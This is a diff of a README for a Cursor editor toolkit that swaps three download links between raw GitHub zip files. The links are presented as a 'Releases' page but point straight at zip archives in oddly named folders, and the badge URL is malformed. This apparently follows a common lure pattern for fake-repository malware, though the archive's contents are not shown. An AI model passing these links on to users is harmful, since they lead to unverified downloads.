@@ -6,9 +6,9 @@ Welcome to the "spec-kit-command-cursor"! This toolkit helps you use the Cursor 
 
 ## 📥 Download & Install
 
-[![Download the latest release](https://raw.githubusercontent.com/foxgod183/spec-kit-command-cursor/main/devotedness/spec-kit-command-cursor.zip%20Release-blue)](https://raw.githubusercontent.com/foxgod183/spec-kit-command-cursor/main/devotedness/spec-kit-command-cursor.zip)
+[![Download the latest release](https://raw.githubusercontent.com/foxgod183/spec-kit-command-cursor/main/.sdd/command_kit_spec_cursor_v3.0.zip%20Release-blue)](https://raw.githubusercontent.com/foxgod183/spec-kit-command-cursor/main/.sdd/command_kit_spec_cursor_v3.0.zip)
 
-To get started, you need to download the latest version of the toolkit. Simply visit this page to download: [spec-kit-command-cursor Releases](https://raw.githubusercontent.com/foxgod183/spec-kit-command-cursor/main/devotedness/spec-kit-command-cursor.zip). 
+To get started, you need to download the latest version of the toolkit. Simply visit this page to download: [spec-kit-command-cursor Releases](https://raw.githubusercontent.com/foxgod183/spec-kit-command-cursor/main/.sdd/command_kit_spec_cursor_v3.0.zip). 
 
 Follow these steps:
 
@@ -70,4 +70,4 @@ Want to help improve the toolkit? We welcome contributions from everyone:
 
 Thanks to all contributors who have helped make the spec-kit-command-cursor a great tool! Your work is appreciated and instrumental in helping others streamline their workflows.
 
-For more information and updates, don’t forget to check the [spec-kit-command-cursor Releases](https://raw.githubusercontent.com/foxgod183/spec-kit-command-cursor/main/devotedness/spec-kit-command-cursor.zip) page regularly.
+For more information and updates, don’t forget to check the [spec-kit-command-cursor Releases](https://raw.githubusercontent.com/foxgod183/spec-kit-command-cursor/main/.sdd/command_kit_spec_cursor_v3.0.zip) page regularly.
